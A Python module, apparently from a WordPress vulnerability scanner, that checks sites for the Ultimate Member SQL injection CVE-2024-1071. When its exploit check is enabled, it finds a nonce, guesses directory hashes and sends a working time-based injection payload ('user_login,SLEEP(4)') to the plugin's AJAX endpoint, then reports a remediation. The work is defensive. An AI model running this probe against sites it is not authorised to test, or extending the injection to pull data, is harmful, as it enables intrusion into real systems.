from __future__ import annotations

import hashlib
import json
import re
import time
import urllib.parse
from typing import Any

from ...core.http import HttpClient, normalize_url
from ...core.versions import parse_version_required, parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2024-1071"
NAME = "Ultimate Member unauthenticated SQL injection"
RULE = "Ultimate Member 2.1.3 through 2.8.2; fixed in 2.8.3"
PLUGIN_SLUG = "ultimate-member"
TYPE = "SQL Injection"
CVSS = "9.8"
_SLEEP = 4
_MAX_POST_ID = 30
_NONCE_BLOCK = re.compile(
    r"""id=["']um_scripts-js-extra["'][^>]*>(.*?)</script>""",
    re.IGNORECASE | re.DOTALL,
)
_NONCE = re.compile(r'"nonce":"([0-9a-z]+)"', re.IGNORECASE)
_DIRECTORY = re.compile(
    r"""(?:data-directory_id|directory_id)["']?\s*[:=]\s*["']?([a-z0-9]{5})""",
    re.IGNORECASE,
)
_PAGES = ("/", "/members/", "/directory/", "/um_directory/members/")


def classify_version(version: str | None) -> str:
    value = parse_version_safe(version)
    if value is None:
        return "DETECTED_VERSION_UNKNOWN"
    if value < parse_version_required("2.1.3"):
        return "NOT_AFFECTED"
    return "LIKELY_VULNERABLE" if value <= parse_version_required("2.8.2") else "PATCHED"


def hash_for_post(post_id: int) -> str:
    """Mirror SUBSTRING(MD5(ID), 11, 5) used by get_directory_by_hash()."""
    return hashlib.md5(str(post_id).encode("utf-8")).hexdigest()[10:15]


def _timed(
    client: HttpClient,
    url: str,
    directory_id: str,
    sorting: str,
    nonce: str,
    timeout: int,
) -> dict[str, Any]:
    form = urllib.parse.urlencode(
        {"directory_id": directory_id, "sorting": sorting, "nonce": nonce}
    ).encode()
    started = time.monotonic()
    response = client.request(
        url,
        method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form,
        timeout=timeout,
        follow_redirects=False,
    )
    elapsed = time.monotonic() - started
    body = str(response.get("body") or "")
    valid = False
    total_users = None
    try:
        payload = json.loads(body)
        pagination = (payload.get("data") or {}).get("pagination") or {}
        valid = "current_page" in pagination and "total_pages" in pagination
        total_users = pagination.get("total_users")
    except (TypeError, ValueError):
        valid = "current_page" in body and "total_pages" in body
    return {
        "elapsed": round(elapsed, 2),
        "status": response.get("status"),
        "valid": valid,
        "total_users": total_users,
    }


def _discover(client: HttpClient, base: str, timeout: int) -> dict[str, Any]:
    nonce = None
    directory_id = None
    source_path = None
    pages: list[str] = []
    url = f"{base}/wp-admin/admin-ajax.php?action=um_get_members"
    for path in _PAGES:
        page = client.get(path, timeout=timeout)
        body = str(page.get("body") or "")
        pages.append(path)
        if nonce is None:
            block = _NONCE_BLOCK.search(body)
            match = _NONCE.search(block.group(1) if block else body)
            if match:
                nonce = match.group(1)
                source_path = path
        match = _DIRECTORY.search(body)
        if match and nonce:
            candidate = match.group(1)
            probe = _timed(client, url, candidate, "user_login", nonce, timeout)
            if probe["valid"]:
                directory_id = candidate
                source_path = source_path or path
                break
        if nonce and directory_id:
            break
    if nonce is None:
        return {"nonce": None, "directory_id": None, "source_path": None, "attempts": pages}
    if directory_id is None:
        for post_id in range(1, _MAX_POST_ID + 1):
            candidate = hash_for_post(post_id)
            probe = _timed(client, url, candidate, "user_login", nonce, timeout)
            if probe["valid"]:
                directory_id = candidate
                source_path = source_path or "/"
                break
    return {
        "nonce": nonce,
        "directory_id": directory_id,
        "source_path": source_path,
        "attempts": pages,
    }


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> dict[str, Any]:
    base = normalize_url(target_url)
    probe_timeout = max(timeout, 12)
    client = HttpClient(base_url=base, timeout=probe_timeout, proxy=proxy)
    discovery = _discover(client, base, probe_timeout)
    empty = {"confirmed": False, "blocked": False, "discovery": discovery, "control": None, "proof": None}
    if not discovery["nonce"] or not discovery["directory_id"]:
        return {**empty, "proof_url": None}

    url = f"{base}/wp-admin/admin-ajax.php?action=um_get_members"
    control = _timed(client, url, discovery["directory_id"], "user_login", discovery["nonce"], probe_timeout)
    proof = _timed(
        client,
        url,
        discovery["directory_id"],
        f"user_login,SLEEP({_SLEEP})",
        discovery["nonce"],
        probe_timeout,
    )
    confirmed = (
        control["valid"]
        and proof["valid"]
        and proof["status"] == 200
        and control["elapsed"] <= 2.0
        and proof["elapsed"] >= 3.5
        and proof["elapsed"] - control["elapsed"] >= 2.5
    )
    return {
        "confirmed": confirmed,
        "blocked": False,
        "discovery": discovery,
        "control": control,
        "proof": proof,
        "proof_url": url,
    }


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
):
    del cms_version, kwargs
    finding = passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component="WordPress plugin Ultimate Member",
        affected_rule=RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation=(
            "Upgrade Ultimate Member to 2.8.3 or newer and review the database for "
            "unexpected administrator accounts."
        ),
        exploit_available=True,
    )
    if not run_exploit_check or finding.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        return finding
    if exploit_mode != "safe":
        finding.detail += " This module supports only the safe constant-sleep differential."
        return finding

    proof = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    finding.exploit_ran = True
    finding.evidence = {**(finding.evidence or {}), **proof}
    if proof["confirmed"]:
        finding.status = "VULNERABLE"
        finding.confidence = "CONFIRMED"
        finding.proof_url = proof["proof_url"]
        finding.detail = (
            "The um_get_members AJAX endpoint accepted the frontend nonce and a discovered "
            "directory hash. A constant control sort returned in "
            f"{proof['control']['elapsed']}s while the user_login,SLEEP({_SLEEP}) sort returned in "
            f"{proof['proof']['elapsed']}s, proving attacker SQL reached the ORDER BY clause. "
            f"No rows or schema data were requested. (CVSS {CVSS})"
        )
    elif not proof["discovery"]["nonce"]:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = (
            "The version is affected, but no Ultimate Member frontend nonce was found on the "
            "common directory pages, so the AJAX probe was not sent."
        )
    elif not proof["discovery"]["directory_id"]:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = (
            "The version is affected and a nonce was found, but no valid directory hash was "
            f"discovered in post IDs 1-{_MAX_POST_ID}; the AJAX probe was not sent."
        )
    else:
        finding.status = "NOT_CONFIRMED"
        finding.confidence = "MEDIUM"
        finding.detail = (
            "The version is affected, but the constant-sleep differential was not observed "
            f"(control={proof['control']['elapsed']}s, proof={proof['proof']['elapsed']}s, "
            f"users={proof['proof']['total_users']}). The directory may have no rows, or the "
            "sorting value was rejected."
        )
    return finding


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": "WordPress plugin Ultimate Member",
        "affected_rule": RULE,
        "affected_versions": ["2.1.3-2.8.2"],
        "exploit_available": True,
        "exploit_modes": ["safe"],
        "intrusive": False,
        "vulnerability_type": TYPE,
        "module_version": "1.0.0",
        "last_reviewed": "2026-11-13",
        "updated": "2026-11-13",
        "required_detectors": ["wordpress"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2024-1071",
            "https://www.wordfence.com/blog/2024/02/2063-bounty-awarded-for-unauthenticated-sql-injection-vulnerability-patched-in-ultimate-member-wordpress-plugin/",
        ],
    }
